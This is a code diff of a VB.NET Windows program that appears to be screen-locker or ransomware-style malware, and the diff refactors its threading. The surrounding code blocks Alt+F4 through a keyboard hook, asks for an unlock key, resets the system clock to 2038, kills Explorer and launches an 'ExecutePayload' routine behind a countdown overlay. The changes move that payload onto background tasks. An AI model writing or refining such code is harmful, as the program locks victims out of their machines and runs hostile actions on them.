@@ -10,6 +10,7 @@ Imports System.ServiceProcess
 Imports System.Text
 Imports System.Threading
 Imports Microsoft.Win32
+Imports System.Threading.Tasks
 
 Public Class Form1
     Inherits Form
@@ -22,7 +23,6 @@ Public Class Form1
     ' Hook handle and callback delegate
     Private hookID As IntPtr = IntPtr.Zero
     Private hookCallbackDelegate As HookProc
-    Private countdownThread As Thread
     ' Define portal image at the class level to preload it once
     Public portalImage As Image
 
@@ -588,11 +588,6 @@ Public Class Form1
             If vkCode = VK_F4 AndAlso (GetAsyncKeyState(VK_MENU) And &H8000) <> 0 Then
                 Return CType(1, IntPtr) ' Prevent Alt + F4
             End If
-
-            ' Use the ThreadPool to run long-running tasks asynchronously
-            ThreadPool.QueueUserWorkItem(Sub()
-                                             ' Perform any long-running operation here if needed
-                                         End Sub)
         End If
 
         Return CallNextHookEx(hookID, nCode, wParam, lParam)
@@ -1439,21 +1434,23 @@ Public Class Form1
             ' 2. Set the system time to 2038
             SetSystemTimeTo2038()
 
-            Try
-                LongRunningTask()
-            Catch ex As Exception
-                Console.WriteLine("Error in ExecutePayloadWork: " & ex.Message)
-            End Try
-
+            ' Run the long-running task asynchronously
+            Task.Factory.StartNew(Sub()
+                                      Try
+                                          LongRunningTask()
+                                      Catch ex As Exception
+                                          Console.WriteLine("Error in ExecutePayloadWork: " & ex.Message)
+                                      End Try
+                                  End Sub)
         Else
             MessageBox.Show("Incorrect key. Please try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
         End If
     End Sub
 
     Private Sub LongRunningTask()
-        ThreadPool.QueueUserWorkItem(Sub()
-                                         ExecutePayload()
-                                     End Sub)
+        Task.Factory.StartNew(Sub()
+                                  ExecutePayload()
+                              End Sub)
     End Sub
 
     Private Sub KillExplorerAndMore()
@@ -1579,12 +1576,20 @@ Public Class Form1
         If overlay.countdownTime > 0 Then
             overlay.countdownTime -= 1
 
-            ' Update the overlay directly on the UI thread.
-            UpdateOverlay()
+            ' Run the UI update on a separate task, ensuring it runs on the UI thread.
+            Task.Factory.StartNew(Sub()
+                                      ' Use Invoke if necessary to update the UI thread safely.
+                                      If InvokeRequired Then
+                                          Invoke(New MethodInvoker(AddressOf UpdateOverlay))
+                                      Else
+                                          UpdateOverlay()
+                                      End If
+                                  End Sub)
         Else
             ' Stop the timer when the countdown reaches zero and handle completion.
             CountDownTimer.Stop()
             OnCountdownComplete()
         End If
     End Sub
+
 End Class
